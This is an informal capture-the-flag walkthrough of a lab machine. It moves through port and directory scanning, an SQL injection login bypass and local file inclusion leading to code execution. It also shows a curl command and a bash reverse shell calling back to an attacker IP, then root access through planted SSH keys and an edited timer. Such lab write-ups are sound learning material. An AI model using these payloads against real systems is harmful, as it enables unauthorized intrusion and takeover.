Started with a nmap scan when you port scan you to many ports seems like every port is open 
```
22 OpenSSH 8.2p1
80 Apache 2.4.41
```
Starting a gobuster scan 
```
/login.php
/images
/index.html
/users.html
/messages.html
/orders.html
/secret-script.php?file=
```
The only link that does anything is the login its also the only php script I did a sql injection into the login and and was able to bypass the login` ' || 1=1;-- -` and this takes us to some pages with a hidden parameter of `file=` and then adds a `php:///filter/recourse=` so we must have LFI here and we do have LFI I can read passwd file the only user is `comte` we can dump the mysql database and it has a hash in it but cant crack it after a while I was finally able to bypass the LFI restrictions with this script called `php_filter_chain_generator.py` you can find it on github and we run it and send it to a payload.txt file open a listener and then use this curl command to get a reverse shell `curl -s "http://10.10.23.74/secret-script.php?file=$(cat poayload.txt)"` and I just used a normal bash rev shell `<?php system('bash -c \"bash -i >& /dev/tcp/10.13.8.255/4445 0>&1\"')` now we have a shell as `www-data` to get the user we can just put in are own authorized keys in the file and then ssh into as `comte` when we go `sudo -l` we can run some timer files and we can edit them as well but when we try and retstart it it fails but we can edit the `explooit.timer` file and just add `5s` to the onboot and restart it and go to `/opt` and there is now a xxd file in there if we go to GTFObins there is some stuff we can do to make us root now we can write to the `autorized_keys` file in the root folder and now we are root